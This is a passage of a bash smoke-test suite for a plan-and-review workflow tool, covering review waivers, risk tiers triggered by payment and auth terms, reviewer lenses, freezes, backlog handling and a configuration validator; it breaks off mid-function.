#     classes; a class closed in two tasks suggests the exact lessons.sh add.
T57="$SMOKE_TMP/t57"; TW="$(cal_run "$T57" "$TWO")" || fail "init for check 57 failed"
G1="$(wcommit "$TW" g1 a.md)"
for l in 1 3; do fx2 "$T57" "$FS" plans/v-plan.md add "$l" --severity blocking --class ignored-hides --at "x$l.py:1" --sha "$G1" "m" >/dev/null; fx2 "$T57" "$FS" plans/v-plan.md close "$l" F-001 >/dev/null; done
(cd "$T57" && "$EX/lessons.sh" plans/v-plan.md add "pytest cache dirty" "w" "r" "f" "docs" >/dev/null)
B57="$(brief "$T57" plans/v-plan.md)"
has '^KNOWN_DEFECT_CLASSES: L-001:pytest-cache-dirty, ignored-hides$' "$B57" || fail "KNOWN_DEFECT_CLASSES is wrong: $(grep KNOWN <<<"$B57")"
has '^LESSON_SUGGESTED: lessons.sh "plans/v-plan.md" add "ignored-hides" "finding class ignored-hides recurred in the tasks at lines 1, 3"' "$B57" || fail "no lessons.sh suggestion for a class seen in two tasks"
(cd "$T57" && "$EX/lessons.sh" plans/v-plan.md add "ignored hides" "w" "r" "f" "docs" >/dev/null)
! has '^LESSON_SUGGESTED:' "$(brief "$T57" plans/v-plan.md)" || fail "a lesson was suggested again after it was filed"
ok "known defect classes from lessons and closed findings; LESSON_SUGGESTED once per unfiled recurring class"

# 58. (H) Script confusions: SINCE = TASK_BASE in the brief; every script works
#     from the plan worktree with base-relative, absolute and worktree-copy plan
#     paths (a worktree copy acts on the base checkout's plan); complete names
#     the missing prerequisite and the exact command; npm steps only from
#     scripts that exist.
T58="$SMOKE_TMP/t58"; TW="$(cal_run "$T58" "$TWO")" || fail "init for check 58 failed"
B58="$(brief "$T58" plans/v-plan.md)"; [ "$(sed -n 's/^SINCE: //p' <<<"$B58")" = "$(sed -n 's/^TASK_BASE: //p' <<<"$B58")" ] || fail "SINCE is not TASK_BASE"
H58="$(wcommit "$TW" h1 a.md)"
for P in "$T58/plans/v-plan.md" plans/v-plan.md; do
  for c in "$EX/iterate.sh $P" "$EX/risk-tier.sh $P 1 --no-record" "$EX/green-gate.sh $P check" "$FS $P list 1" "$EX/backlog.sh $P count" "$EX/status.sh $P" "$EX/snapshot.sh $P" "$EX/lessons.sh $P recall docs"; do
    O58="$(cd "$TW" && $c 2>&1 || true)"
    ! has 'not initialized\|plan not found' "$O58" || fail "from the plan worktree, '$c' said: $(head -2 <<<"$O58")"
  done
done
rm -f "$(st "$T58" plans/v-plan.md)/gate/last.json"
O58="$(cd "$T58" && "$CP" plans/v-plan.md complete 1 ok 2>&1 || true)"
has "run risk-tier.sh for line 1 first: risk-tier.sh plans/v-plan.md 1 --since" "$O58" && has "green-gate.sh plans/v-plan.md check" "$O58" && has "checkpoint.sh plans/v-plan.md review 1 $H58" "$O58" \
  || fail "complete did not name the missing prerequisites with exact commands: $O58"
(cd "$TW" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null && "$CP" plans/v-plan.md review 1 "$H58" APPROVE >/dev/null \
  && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete from the plan worktree with its copy of the plan failed"
grep -q '^- \[x\] \*\*Phase 1.1' "$T58/plans/v-plan.md" && grep -q '^- \[ \] \*\*Phase 1.1' "$TW/plans/v-plan.md" || fail "complete from the worktree did not tick the base checkout's plan"
T58N="$SMOKE_TMP/t58n"; TW="$(cal_run "$T58N" "$TWO")" || fail "init for the npm check failed"
printf '{"scripts": {}}\n' >"$TW/package.json"; git -C "$TW" add -A; git -C "$TW" commit -qm pkg
O58="$(cd "$T58N" && "$EX/green-gate.sh" plans/v-plan.md check 2>&1 || true)"
has 'GATE_STEP: typecheck SKIPPED' "$O58" && ! has 'npm run' "$O58" || fail "green-gate invented an npm script: $O58"
ok "script confusions: SINCE = TASK_BASE; worktree cwd and plan paths resolve; complete names exact prerequisites; npm steps only from package.json scripts"

# 59. (J) Measurement: status.sh --review-metrics reports rounds, blocking rounds,
#     attempts and minutes per round per task; ADR-0004 states how calibration is judged.
T59="$SMOKE_TMP/t59"; TW="$(cal_run "$T59" "$TWO")" || fail "init for check 59 failed"
vc "$T59" review 1 "$(wcommit "$TW" m1 a.md)" REQUEST_CHANGES >/dev/null; vc "$T59" review 1 "$(wcommit "$TW" m2 a.md)" APPROVE >/dev/null
O59="$(cd "$T59" && "$EX/status.sh" plans/v-plan.md --review-metrics)"
has '^REVIEW_METRIC: 1 2 1 1 [0-9.]* no$' "$O59" && has '^REVIEW_TOTAL: rounds=2 blocking_rounds=1 tasks=1$' "$O59" || fail "review metrics are wrong: $O59"
grep -q 'before/after' "$ADR4" && grep -q 'halt-repair-loop' "$ADR4" || fail "ADR-0004 does not state the measurement or credit the downstream feedback"
ok "review metrics: rounds, blocking rounds, attempts, minutes per round; measurement stated in ADR-0004"

# 60. Round-1 review fixes (ADR-0004): waiver scope, tier reasons to reviewers,
#     distinct-lens floor and signal lenses, full review after a tier rise,
#     directive floors, freeze cleared by fail/rewind, findings key, backlog
#     pending close, narrower content exemption, no-worktree snapshots.
# (1) A waiver covers only the REQUEST_CHANGES it listed; not while a freeze
#     has verdicts outstanding; not a negated reply; it clears only its own line's halt.
T60="$SMOKE_TMP/t60"; TW="$(cal_run "$T60" "$TWO")" || fail "init for check 60 failed"
W60="$(wcommit "$TW" w a.md)"; (cd "$T60" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
vc "$T60" freeze 1 "$W60" --reviewers 3 >/dev/null
has '^ASK_HUMAN:' "$(cd "$T60" && APEX_ASK_HUMAN_AFTER=1 "$CP" plans/v-plan.md review 1 "$W60" REQUEST_CHANGES rA 2>&1)" || fail "no ASK_HUMAN with APEX_ASK_HUMAN_AFTER=1"
expect_refusal "a waiver while the round has verdicts outstanding" "verdicts outstanding (1/3)" vc "$T60" waive 1 "$W60" "waive 1" "r"
vc "$T60" unfreeze 1 >/dev/null
expect_refusal "a negated waiver reply" "does not start with 'waive 1'" vc "$T60" waive 1 "$W60" "I do not want to waive 1" "r"
vc "$T60" halt "awaiting human review waiver line 3" >/dev/null
vc "$T60" waive 1 "$W60" "waive 1" "rA's finding" >/dev/null || fail "the waiver of rA was refused"
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert s["halted"]; w=s["operator_overrides"][-1]; assert w["waived_verdicts"]==1 and len(w["covered"])==1' "$(st "$T60" plans/v-plan.md)/checkpoint.json" \
  || fail "a waiver cleared another line's halt or did not list what it covers"
vc "$T60" resume "probe" >/dev/null
O60="$(vc "$T60" review 1 "$W60" REQUEST_CHANGES rB --role lens:money 2>&1)"; has 'after the waiver — not covered' "$O60" || fail "a REQUEST_CHANGES after the waiver did not ask again: $O60"
expect_refusal "a lens dispatched after the waiver returning REQUEST_CHANGES" "requested changes" vc "$T60" complete 1 ok
T60B="$SMOKE_TMP/t60b"; TW="$(cal_run "$T60B" "$TWO")" || fail "init for check 60 (b) failed"
W60="$(wcommit "$TW" w a.md)"; (cd "$T60B" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
vc "$T60B" review 1 "$W60" REQUEST_CHANGES rA >/dev/null; vc "$T60B" waive 1 "$W60" "waive 1" "r" >/dev/null
vc "$T60B" review 1 "$W60" REQUEST_CHANGES rC --role adversarial >/dev/null
expect_refusal "a late adversarial REQUEST_CHANGES after the waiver" "requested changes" vc "$T60B" complete 1 ok
vc "$T60B" waive 1 "$W60" "waive 1, as well" "r2" >/dev/null
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["operator_overrides"][-1]["waived_verdicts"]=7; s["operator_overrides"][0]["waived_verdicts"]=7; json.dump(s, open(p,"w"))' "$(st "$T60B" plans/v-plan.md)/checkpoint.json"
expect_refusal "a waiver whose waived_verdicts does not match" "requested changes" vc "$T60B" complete 1 ok
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["operator_overrides"][-1]["waived_verdicts"]=2; json.dump(s, open(p,"w"))' "$(st "$T60B" plans/v-plan.md)/checkpoint.json"
vc "$T60B" complete 1 ok >/dev/null 2>&1 || fail "a waiver covering both REQUEST_CHANGES did not complete"
# (2) Overridden signals reach the reviewers; an unanticipated one is flagged.
T60C="$SMOKE_TMP/t60c"; TW="$(cal_run "$T60C" '- [ ] **Phase 1.1** [docs][tier:a reason="vendored code"] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs][tier:a reason="stripe charge client stub"] b\n  - Acceptance: true\n')" || fail "init for check 60 (c) failed"
wcommit "$TW" 'charge(1)' x.py >/dev/null
O60="$(cd "$T60C" && "$EX/risk-tier.sh" plans/v-plan.md 1)"; has '^TIER_C_UNANTICIPATED: ' "$O60" || fail "an override reason that does not mention the signal was not flagged: $O60"
has '^TIER_C_OVERRIDDEN: ' "$(cd "$T60C" && "$EX/risk-tier.sh" plans/v-plan.md 3 --no-record)" || fail "an anticipated override was not reported as TIER_C_OVERRIDDEN"
B60="$(brief "$T60C" plans/v-plan.md)"
has '^TIER_REASONS: Tier A' "$B60" && has '^  ! TIER_C_UNANTICIPATED: ' "$B60" && has "^  - tier-c content signal in diff: 'charge(' (x.py) — overridden" "$B60" || fail "the brief did not print the recorded tier reasons: $(grep -A3 TIER_REASONS <<<"$B60")"
for f in "$GR" "$PLUGIN_ROOT/commands/iterate.md" "$MARKET_ROOT/plugins/apex-dispatch/skills/dispatch-route/SKILL.md"; do grep -q 'TIER_REASONS' "$f" || fail "$(basename "$f") does not pass TIER_REASONS to reviewers"; done
printf -- '- [ ] **Phase 1.1** `[tier:a reason="x"]` a\n  - Acceptance: true\n' >"$SMOKE_TMP/t60-span.md"
python3 -c 'import json,sys; sys.path.insert(0, sys.argv[1]); import planlib; assert planlib.cmd_task(sys.argv[2], 1)["tier_override"] is None' "$EX" "$SMOKE_TMP/t60-span.md" || fail "an override inside a code span was honoured"
# (3) Distinct lenses; the lens of each Tier C signal is kept.
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Review: lenses=money,money,security\n' >"$SMOKE_TMP/t60-dup.md"
has 'names a lens more than once' "$(python3 "$EX/planlib.py" validate "$SMOKE_TMP/t60-dup.md" 2>&1 || true)" || fail "a repeated lens name was accepted"
T60D="$SMOKE_TMP/t60d"; TW="$(cal_run "$T60D" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Review: lenses=correctness,security,performance\n')" || fail "init for check 60 (d) failed"
mkdir -p "$TW/src/billing"; HD="$(wcommit "$TW" x src/billing/rates.txt)"
has '^SIGNAL_LENSES: money$' "$(cd "$T60D" && "$EX/risk-tier.sh" plans/v-plan.md 1)" || fail "a billing path did not name the money lens"
(cd "$T60D" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1); vc "$T60D" review 1 "$HD" APPROVE >/dev/null; vc "$T60D" review 1 "$HD" APPROVE adv --role adversarial >/dev/null; vc "$T60D" approve 1 "$HD" "approve G12 1" >/dev/null
has 'lenses=correctness,performance,security (+money required by the tier signals)' "$(vc "$T60D" complete 1 ok 2>&1)" || fail "a Tier C lens narrowing dropped the money lens of a billing signal"
# (4) A mid-attempt tier rise forces a full review.
T60E="$SMOKE_TMP/t60e"; TW="$(cal_run "$T60E" "$TWO")" || fail "init for check 60 (e) failed"
E1="$(wcommit "$TW" e1 a.md)"; (cd "$T60E" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise B --reason "shared helper" >/dev/null); vc "$T60E" review 1 "$E1" REQUEST_CHANGES >/dev/null
B60="$(brief "$T60E" plans/v-plan.md)"; has '^REVIEW_MODE: verify$' "$B60" && has "^REVIEW_SINCE: $E1$" "$B60" || fail "round 2 at the same tier was not verify since the reviewed SHA"
(cd "$T60E" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise C --reason "reviewer: it signs tokens" >/dev/null)
B60="$(brief "$T60E" plans/v-plan.md)"
has '^REVIEW_MODE: full (the tier rose to C after reviews at B' "$B60" && has "^REVIEW_SINCE: $(sed -n 's/^TASK_BASE: //p' <<<"$B60")$" "$B60" || fail "a tier rise mid-attempt did not force a full review: $(grep REVIEW_ <<<"$B60")"
# (5) Directive floors: a sensitive-tagged task keeps the adversarial pass and
#     cannot raise the cap; with apex-dispatch the route's shape is a floor.
T60F="$SMOKE_TMP/t60f"; TW="$(cal_run "$T60F" '- [ ] **Phase 1.1** [docs][money] a\n  - Acceptance: true\n  - Review: cap=9 adversarial=no\n')" || fail "init for check 60 (f) failed"
for i in 1 2 3; do vc "$T60F" review 1 "$(wcommit "$TW" "c$i" a.md)" REQUEST_CHANGES >/dev/null || fail "blocking round $i refused"; done
expect_refusal "cap=9 raising the cap on a sensitive task" "REVIEW_CAP: 3 review rounds" vc "$T60F" review 1 "$(wcommit "$TW" c4 a.md)" REQUEST_CHANGES
vc "$T60F" fail 1 x >/dev/null; HF="$(git -C "$TW" rev-parse HEAD)"; vc "$T60F" review 1 "$HF" APPROVE >/dev/null
(cd "$T60F" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
has 'adversarial=no (mandatory for Tier C / sensitive tasks)' "$(vc "$T60F" complete 1 ok 2>&1)" || fail "adversarial=no was applied to a money-tagged task"
T60G="$SMOKE_TMP/t60g"; TW="$(cal_run "$T60G" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Review: adversarial=no\n')" || fail "init for check 60 (g) failed"
T60GS="$(st "$T60G" plans/v-plan.md)"; mkdir -p "$T60GS/dispatch/reviews-raw"
printf '{"route_id": "r-x-L1-1", "line": 1, "router": {"review_shape": "fanout6+adversarial", "diversity": "off"}}' >"$T60GS/dispatch/active-route.json"
HG="$(wcommit "$TW" g a.md)"; (cd "$T60G" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
expect_refusal "adversarial=no below the route's review shape" "review shape fanout6+adversarial requires it" indir "$T60G" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md complete 1 ok
# (7) fail and rewind clear a freeze.
T60H="$SMOKE_TMP/t60h"; TW="$(cal_run "$T60H" "$TWO")" || fail "init for check 60 (h) failed"
H1="$(wcommit "$TW" h1 a.md)"; vc "$T60H" freeze 1 "$H1" --reviewers 2 >/dev/null; vc "$T60H" fail 1 x >/dev/null
! has '^FROZEN:' "$(brief "$T60H" plans/v-plan.md)" && vc "$T60H" review 1 "$(wcommit "$TW" h2 a.md)" APPROVE >/dev/null || fail "fail did not clear the freeze"
H3="$(git -C "$TW" rev-parse HEAD)"; vc "$T60H" freeze 1 "$H3" --reviewers 2 >/dev/null; vc "$T60H" rewind 1 >/dev/null
python3 -c 'import json,sys; assert "1" not in (json.load(open(sys.argv[1])).get("freezes") or {})' "$(st "$T60H" plans/v-plan.md)/checkpoint.json" || fail "rewind did not clear the freeze"
# (8) findings: distinct mechanisms stay separate; a non-blocking re-report never reopens.
T60I="$SMOKE_TMP/t60i"; TW="$(cal_run "$T60I" "$TWO")" || fail "init for check 60 (i) failed"; I1="$(wcommit "$TW" i a.md)"
fx2 "$T60I" "$FS" plans/v-plan.md add 1 --severity blocking --class race --at a.py:1 --sha "$I1" "lock released early" >/dev/null
has 'DUPLICATE.*mechanism added' "$(fx2 "$T60I" "$FS" plans/v-plan.md add 1 --severity blocking --class race --at a.py:1 --sha "$I1" "double write on retry")" || fail "a second mechanism of the same defect was not added to its entry"
python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert len(d["items"])==1 and len(d["items"][0]["mechanisms"])==2, d' "$(fx2 "$T60I" "$FS" plans/v-plan.md path 1)" || fail "a defect was counted twice"
fx2 "$T60I" "$FS" plans/v-plan.md close 1 F-001 >/dev/null
has 'DUPLICATE.*-> closed' "$(fx2 "$T60I" "$FS" plans/v-plan.md add 1 --severity non-blocking --class race --at a.py:1 --sha "$I1" "lock released early")" || fail "a non-blocking re-report reopened a closed blocking finding"
# (9) backlog: done from a task is pending until that task completes; fail reopens it.
T60J="$SMOKE_TMP/t60j"; TW="$(cal_run "$T60J" "$TWO")" || fail "init for check 60 (j) failed"
(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md add 1 "harden x" >/dev/null); J1="$(wcommit "$TW" j a.md)"
expect_refusal "done without a closing SHA" "needs --line LINE --sha" indir "$T60J" "$EX/backlog.sh" plans/v-plan.md done B-001
(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md done B-001 --line 1 --sha "$J1" >/dev/null)
has 'pending close: line 1' "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md list)" && [ "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md count)" = 1 ] || fail "a task's done was not pending"
vc "$T60J" fail 1 x >/dev/null
! has 'pending close' "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md list)" || fail "fail did not reopen a pending close"
(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md done B-001 --line 1 --sha "$J1" >/dev/null && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null \
  && "$CP" plans/v-plan.md review 1 "$J1" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete failed in check 60 (j)"
[ "$(cd "$T60J" && "$EX/backlog.sh" plans/v-plan.md count)" = 0 ] && grep -q "B-001 .*(done .* at ${J1:0:12}, line 1)" "$T60J/.claude/apex-scope-loop/BACKLOG.md" || fail "complete did not confirm the pending close"
# (10) Markdown outside docs/ and smoke-named source files are scanned.
has '^TIER: B' "$(rtc '[docs]' README.md 'stripe keys live here')" || fail "a Markdown-only content term was exempted or raised to C"
has '^TIER: C' "$(rtc '[docs]' src/smoke_helper.py 'import stripe')" || fail "content in src/smoke_helper.py was exempted"
# (11) A run without a worktree keeps snapshots outside the work tree.
T60K="$SMOKE_TMP/t60k"; mkdir -p "$T60K/plans"; git init -q -b main "$T60K"; printf '.dev-plan-state/\n' >"$T60K/.gitignore"
T60K="$(cd "$T60K" && pwd -P)"   # git reports the resolved path on macOS (/var -> /private/var)
printf -- "$TWO" >"$T60K/plans/v-plan.md"; git -C "$T60K" add -A; git -C "$T60K" commit -qm k
( cd "$T60K" && APEX_NO_WORKTREE=1 "$EX/init.sh" plans/v-plan.md >/dev/null 2>&1 ) || fail "no-worktree init failed in check 60"
SPK="$(cd "$T60K" && "$EX/snapshot.sh" plans/v-plan.md | sed -n 's/^REVIEW_SNAPSHOT: //p')"
case "$SPK" in "$T60K/.git/apex-scope-loop-snapshots/"*) ;; *) fail "a no-worktree snapshot is not under the common git dir: $SPK" ;; esac
has 'GATE: SKIPPED\|GATE: PASS' "$(cd "$T60K" && "$EX/green-gate.sh" plans/v-plan.md check 2>&1)" || fail "a no-worktree snapshot dirtied the gate"
ok "round-1 fixes: waiver covers only its listed verdicts (freeze, negation, own-line halt, late verdicts); TIER_REASONS and unanticipated overrides; distinct and signal lenses; full review after a tier rise; directive floors; freeze cleared; findings key; backlog pending close; narrower exemption; no-worktree snapshots"

# 61. Round-2 review fixes (ADR-0004): the review mode is enforced, every Tier C
#     content term is checked against an override, plain waiver replies, ASK_HUMAN
#     pending during a freeze, Markdown-only terms give Tier B, done without state.
# (1) A tier rise after round 1: the brief (taken before risk-tier) still says
#     verify; review-mode and freeze know better; a verify-only Tier C fan-out
#     cannot complete; a full Tier C round can.
T61="$SMOKE_TMP/t61"; TW="$(cal_run "$T61" "$TWO")" || fail "init for check 61 failed"
R1="$(wcommit "$TW" r1 a.md)"; (cd "$T61" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise B --reason "shared helper" >/dev/null); vc "$T61" review 1 "$R1" REQUEST_CHANGES >/dev/null
mkdir -p "$TW/src/auth"; R2="$(wcommit "$TW" fix src/auth/token.py)"
has '^REVIEW_MODE: verify$' "$(brief "$T61" plans/v-plan.md)" || fail "the brief before risk-tier did not still say verify (fixture)"
(cd "$T61" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
has '^REVIEW_MODE: full (the tier rose to C' "$(vc "$T61" review-mode 1)" || fail "review-mode after risk-tier did not say full"
expect_refusal "freeze --mode verify after a tier rise" "the tier rose to C" vc "$T61" freeze 1 "$R2" --reviewers 2 --mode verify
vc "$T61" review 1 "$R2" APPROVE --mode verify >/dev/null; vc "$T61" review 1 "$R2" APPROVE adv --role adversarial --mode verify >/dev/null
vc "$T61" approve 1 "$R2" "approve G12 1" >/dev/null
expect_refusal "a verify-only Tier C fan-out" "no full review at Tier C" vc "$T61" complete 1 ok
vc "$T61" freeze 1 "$R2" --reviewers 1 --mode full >/dev/null || fail "freeze --mode full refused"
vc "$T61" review 1 "$R2" APPROVE adv2 --role adversarial >/dev/null
python3 -c 'import json,sys; x=json.load(open(sys.argv[1]))["reviews"]["1"]["records"][-1]; assert x["mode"]=="full" and x["tier"]=="C", x' "$(st "$T61" plans/v-plan.md)/checkpoint.json" || fail "a frozen full round did not record mode full at Tier C"
vc "$T61" complete 1 ok >/dev/null 2>&1 || fail "a full Tier C round with an adversarial pass did not complete"
# (2) Every distinct Tier C content term is checked against the override reason.
O61="$(rtc '[docs][tier:b reason="price display formatting"]' a_view.py 'label = price' b_util.py 'h = bcrypt.hash(p)')"
has "^TIER_C_OVERRIDDEN: tier-c content signal in diff: 'price' (a_view.py)" "$O61" && has "^TIER_C_UNANTICIPATED: tier-c content signal in diff: 'bcrypt' (b_util.py)" "$O61" \
  && has '^SIGNAL_LENSES: .*security' "$O61" && has '^TIER: B' "$O61" || fail "not every Tier C content term was checked against the override: $O61"
# (3) Waiver replies: plain wording with other words is accepted, refusals are named.
T61B="$SMOKE_TMP/t61b"; TW="$(cal_run "$T61B" "$TWO")" || fail "init for check 61 (b) failed"; RB="$(wcommit "$TW" b a.md)"
vc "$T61B" review 1 "$RB" REQUEST_CHANGES >/dev/null
# Round 3: the reply must START with "waive <LINE>" (after quotes/backticks); nothing else is parsed.
for ok in "waive 1" "Waive 1 — not worth another round" '`waive 1`' "waive 1, no further changes needed"; do
  vc "$T61B" waive 1 "$RB" "$ok" "r" >/dev/null || fail "the plain waiver reply '$ok' was refused"
done
for bad in "I don't think we should waive 1" "I do not think you should waive 1 yet" "Do NOT under any circumstances waive 1" \
           "Please hold off, I won't be able to waive 1 until Monday" "don’t waive 1" "No worries, waive 1" "Yes waive 1" "waive 10"; do
  expect_refusal "the waiver reply '$bad'" "ask the human to reply plainly \`waive 1\` (optionally followed by a remark)" vc "$T61B" waive 1 "$RB" "$bad" "r"
done
# (4) ASK_HUMAN during an outstanding freeze says to finish the round first.
R4="$(wcommit "$TW" b2 a.md)"; vc "$T61B" freeze 1 "$R4" --reviewers 2 >/dev/null
O61="$(cd "$T61B" && APEX_ASK_HUMAN_AFTER=1 "$CP" plans/v-plan.md review 1 "$R4" REQUEST_CHANGES 2>&1)"
has "^ASK_HUMAN: pending — record the rest of this round's verdicts first (1/2 in)" "$O61" && ! has 'halt and ask' "$O61" || fail "ASK_HUMAN asked for a halt during an outstanding freeze: $O61"
# (6) Markdown with a code signal beside it is still Tier C.
has '^TIER: C' "$(rtc '[docs]' README.md 'stripe' src/x.py 'import stripe')" || fail "a content term in code beside Markdown was not Tier C"
# (7) done --line --sha without run state is refused.
T61N="$SMOKE_TMP/t61n"; mkdir -p "$T61N/plans"; git init -q -b main "$T61N"; printf -- "$TWO" >"$T61N/plans/v-plan.md"; git -C "$T61N" add -A; git -C "$T61N" commit -qm n
(cd "$T61N" && "$EX/backlog.sh" plans/v-plan.md add 1 "x" >/dev/null) || fail "backlog add without run state failed"
expect_refusal "done --line --sha without run state" "no run state" indir "$T61N" "$EX/backlog.sh" plans/v-plan.md done B-001 --line 1 --sha "$(git -C "$T61N" rev-parse HEAD)"
# Round 3: a frozen round that completes with an APPROVE still asks, when one of its verdicts requested changes.
R5="$(wcommit "$TW" b3 a.md)"; vc "$T61B" freeze 1 "$R5" --reviewers 2 >/dev/null
vc "$T61B" review 1 "$R5" REQUEST_CHANGES >/dev/null
O61="$(vc "$T61B" review 1 "$R5" APPROVE r2 --role lens:money 2>&1)"
has '^FREEZE: lifted' "$O61" && has '^ASK_HUMAN: line 1 has REQUEST_CHANGES in' "$O61" || fail "a completed frozen round with a REQUEST_CHANGES did not ask the human: $O61"
# Round 3: Markdown that ships as a plugin surface keeps Tier C; other Markdown gets Tier B.
has '^TIER: C' "$(rtc '[docs]' plugins/x/agents/a.md 'Store the stripe secret')" || fail "a Tier C term in a shipped agent prompt was downgraded"
has '^TIER: B' "$(rtc '[docs]' README.md 'stripe')" || fail "a top-level README term was not Tier B"
ok "round-2 fixes: review mode enforced (brief predates the rise; review-mode, freeze and complete enforce full); every content term vs the override; plain waiver replies; ASK_HUMAN pending; Markdown-only Tier B; done needs run state"

# 62. The knobs file (<state-base>/knobs/scope-loop.json, knobslib.py): one validator
#     (unknown keys, ranges, regexes, catch-all globs, reasons, schema), precedence
#     env > file > default, fail closed on an invalid file, extra Tier C terms,
#     exempt globs, Tier B thresholds, review.cap reaching checkpoint, KNOBS in the
#     tier record, the brief and risk-tier's output; the built-in regexes live once.
KL="$EX/knobslib.py"; K62="$SMOKE_TMP/k62"; mkdir -p "$K62/sb/knobs"
GOODK='{"schema": 1, "review": {"cap": 4, "adversary_budget": 0}, "tiers": {"c_terms_extra": ["frobnicate"], "exempt": [{"glob": "plugins/*/agents/*.md", "reason": "agent prompts name auth terms as prose"}], "b_max_lines": 150, "b_shared_dirs": ["api", "lib"]}}'
printf '%s\n' "$GOODK" >"$K62/good.json"
has '^OK$' "$(python3 "$KL" validate "$K62/good.json" 2>&1)" || fail "knobslib rejected a good knobs file: $(python3 "$KL" validate "$K62/good.json" 2>&1)"
for c in '{"bogus": 1}|bogus: unknown key' '{"review": {"cap": 1, "speed": 2}}|review.speed: unknown key' '{"review": {"cap": 11}}|review.cap: 11 is out of range 1-10' \
         '{"review": {"attempt_cap": 0}}|review.attempt_cap: 0 is out of range' '{"tiers": {"b_max_lines": 9}}|tiers.b_max_lines: 9 is out of range' \
         '{"tiers": {"c_terms_extra": ["(unclosed"]}}|tiers.c_terms_extra\[0\]: not a valid Python regex' '{"tiers": {"c_paths_extra": ["x?"]}}|matches the empty string' \
         '{"tiers": {"exempt": [{"glob": "**", "reason": "everything is fine here"}]}}|catch-all' '{"tiers": {"exempt": [{"glob": "*", "reason": "everything is fine here"}]}}|catch-all' '{"tiers": {"exempt": [{"glob": "*/*", "reason": "everything is fine here"}]}}|names no directory' \
         '{"tiers": {"exempt": [{"glob": "docs/*.md", "reason": "  short  "}]}}|tiers.exempt\[0\].reason: required, at least 8' \
         '{"schema": 2}|schema: must be 1' '{"tiers": {"b_shared_dirs": ["a/b"]}}|tiers.b_shared_dirs\[0\]' '{"review": {"cap": "3"}}|review.cap: must be a whole number'; do
  printf '%s\n' "${c%%|*}" >"$K62/bad.json"
  O62="$(python3 "$KL" validate "$K62/bad.json" 2>&1)" && fail "knobslib accepted ${c%%|*}"
  has "^ERROR: .*${c#*|}" "$O62" || fail "knobslib refused ${c%%|*} for the wrong reason: $O62"
done
# Precedence: env (set, non-empty, a whole number) > file > default.
has '^3$' "$(python3 "$KL" get --state-base "$K62/sb" review.cap --env APEX_REVIEW_CAP --default 3)" || fail "knobslib get without a file is not the default"
cp "$K62/good.json" "$K62/sb/knobs/scope-loop.json"
has '^4$' "$(python3 "$KL" get --state-base "$K62/sb" review.cap --env APEX_REVIEW_CAP --default 3)" || fail "knobslib get did not take the file over the default"
has '^7$' "$(APEX_REVIEW_CAP=7 python3 "$KL" get --state-base "$K62/sb" review.cap --env APEX_REVIEW_CAP --default 3)" || fail "knobslib get did not take the env over the file"
has '^4$' "$(APEX_REVIEW_CAP= python3 "$KL" get --state-base "$K62/sb" review.cap --env APEX_REVIEW_CAP --default 3)" || fail "an empty env var won over the file"
python3 - "$(APEX_ERROR_BUDGET=5 python3 "$KL" effective --state-base "$K62/sb")" "$K62/sb/knobs/scope-loop.json" <<'PY' || fail "knobslib effective has the wrong shape"
import hashlib, json, sys
d = json.loads(sys.argv[1])
assert d["file"] == sys.argv[2] and d["exists"] is True and d["sha"] == hashlib.sha256(open(sys.argv[2], "rb").read()).hexdigest()[:12], d
assert d["effective"]["review"]["cap"] == 4 and d["sources"]["review.cap"] == "file" and d["effective"]["review"]["error_budget"] == 5 and d["sources"]["review.error_budget"] == "env"
assert d["sources"]["review.attempt_cap"] == "default" and d["effective"]["tiers"]["b_max_files"] == 6 and d["effective"]["tiers"]["c_terms_extra"] == ["frobnicate"]
assert "stripe" in d["builtins"]["c_terms"] and "auth" in d["builtins"]["c_paths"] and d["limits"]["review.cap"] == [1, 10] and d["env"]["review.cap"] == "APEX_REVIEW_CAP"
PY
! grep -qE "^C_(PATHS|CONTENT)=" "$EX/risk-tier.sh" && grep -q 'knobslib.py' "$EX/risk-tier.sh" || fail "risk-tier.sh keeps its own copy of the Tier C regexes (knobslib.py is the one copy)"
# rtk KNOBS TAGS FILE CONTENT... — risk-tier output (recorded) for a fresh one-task run with that knobs file.
rtk() {
  local d w sb; d="$(mktemp -d "$SMOKE_TMP/rtk.XXXXXX")"; w="$(cal_run "$d" "- [ ] **Phase 1.1** $2 a\n  - Acceptance: true\n")" || { echo init-failed; return 0; }
